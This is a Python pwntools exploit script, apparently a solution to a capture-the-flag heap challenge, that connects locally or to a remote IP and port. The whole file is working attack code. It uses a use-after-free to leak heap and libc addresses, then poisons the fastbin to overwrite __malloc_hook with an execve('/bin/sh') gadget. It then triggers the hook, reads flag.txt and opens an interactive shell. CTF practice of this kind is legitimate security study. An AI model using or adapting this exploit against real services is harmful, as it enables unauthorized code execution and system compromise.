from pwn import *
DEBUG = False
LOCAL = True
def binary_connect():
    if LOCAL:
        if DEBUG:
            p = gdb.debug('./a.out', '''
                break *0x5555555557ff
                break *0x555555555447 // show
                continue
            ''')
        else:
            p = process('./a.out')

    else:
        p = remote('34.136.150.230', 49153)

    return p

def exploit():
    def add(index, len, val):
        p.send(b'1\n' + str(index).encode('utf-8') + b'\n' + str(len).encode('utf-8') + b'\n' + val.encode('utf-8') + b'\n')
        p.recvuntil(b'> ')
    
    def show(index):
        p.send('2\n' + str(index) + '\n')
        return (p.recvuntil(b'> '))
    
    def edit(index, val): # val should be in bytes
        p.send(b'3\n' + str(index).encode('utf-8') + b'\n' + val + b'\n')
        p.recvuntil(b'> ')

    def delete(index):
        p.send(b'4\n' + str(index).encode('utf-8') + b'\n')
        p.recvuntil(b'> ')

    def save(index):
        p.send(b'5\n' + str(index).encode('utf-8') + b'\n')
        p.recvuntil(b'> ')

    def alloc_tcache():
        add(15, 0x60, "Z" * 0x60)
        add(14, 0x60, "Y" * 0x60)
        add(13, 0x60, "X" * 0x60)
        add(12, 0x60, "W" * 0x60)
        add(11, 0x60, "V" * 0x60)
        add(10, 0x60, "U" * 0x60)
        add(9 , 0x60, "T" * 0x60)

    def fill_tcache():    
        delete(15)
        delete(14)
        delete(13)
        delete(12)
        delete(11)
        delete(10)
        delete(9)
    
    # exploit starts here 
    p = binary_connect()
    p.recvuntil(b'> ')

    # alloc target index 1, 2 and fill up tcache bins for 0x70
    add(1, 0x60, "A" * 0x60)
    add(2, 0x60, "B" * 0x60)
    add(3, 0x60, "C" * 0x60)
    alloc_tcache()
    fill_tcache()
    
    # leak heap address - UAF used on index 1, which will have fw ptr pointing to freed chunk @ index 3
    save(1)
    delete(2)
    delete(3) # alloc a third index because turning off ASLR for testing puts index two at an address with & 0xff = 0x00
    delete(1)

    heap_leak = show(1)
    heap_leak = heap_leak.split(b'data: ')[1][0:6]
    heap_addr = hex(int.from_bytes(heap_leak, "little"))
    print("heap addr:\t" + heap_addr)
    
    # consolidate free chunks, index 1 will be consolidated into a small bin with fw ptr to main arena
    # calculate libc base from main_arena addr
    add(3, 4000, 'C' * 4000)
    delete(3)
    arena_leak = show(1)
    arena_leak = arena_leak.split(b'data: ')[1][0:6]
    main_arena_addr = int.from_bytes(arena_leak, "little") - 416  # index location for consolidated unsorted 0x180 chunk 
    print("main arena addr:\t" + hex(main_arena_addr))
    libc_base_addr = main_arena_addr - 0x1ebb80
    print("libc base addr:\t" + hex(libc_base_addr))
    assert (libc_base_addr & 0xfff) == 0
    
    # empty tcache by allocating all 0x70 chunks
    alloc_tcache()

    # allocate 0x60 in fourth index to overlap with UAF index 1 and free. Setup for malloc above main arena
    add(4, 0x60, 'D' * 0x60)

    # fill tcache and then free 4 to get it in fastbins
    fill_tcache()
    delete(4)

    # edit dangling pointer to point 0x70 fastbins chunk->fw = fake chunk - 0x10 (point at chunk, not return addr)
    fake_chunk_addr = main_arena_addr - 0x43  # addr - 0x8 = 0x7f
    print("fake chunk addr:\t" + hex(fake_chunk_addr))
    edit(1, fake_chunk_addr.to_bytes(7,"little"))

    # empty tcache
    alloc_tcache()
    
    # alloc 2 0x70 chunks from tcache to get the second chunk within the main arena
    # send in rop chain, overwriting __malloc_hook
    add(5, 0x60, 'E' * 0x60)

    # local libc gadgets
    # execve_binsh = 0xcbd1a +  libc_base_addr
    # bin_sh_addr  = 0x18a152 + libc_base_addr
    # pop_r12_ret  = 0x26e9a +  libc_base_addr
    
    # ununtu libc.so.6
    execve_binsh = 0xe6c81 + libc_base_addr # requires [r15] and [rbx] are null

    p.send(b'1\n' + str(6).encode('utf-8') + b'\n' + str(0x60).encode('utf-8') + b'\n' + \
        b'A' * 0x23 + p64(execve_binsh) + b'\n')
    # allocate another chunk to trigger __malloc_hook
    p.send(b'1\n' + str(7).encode('utf-8') + b'\n' + b'0\n' + b'cat flag.txt\n')
    print(p.recv())
    p.interactive()

if __name__ == "__main__":
    # context.log_level = 'debug'
    exploit()
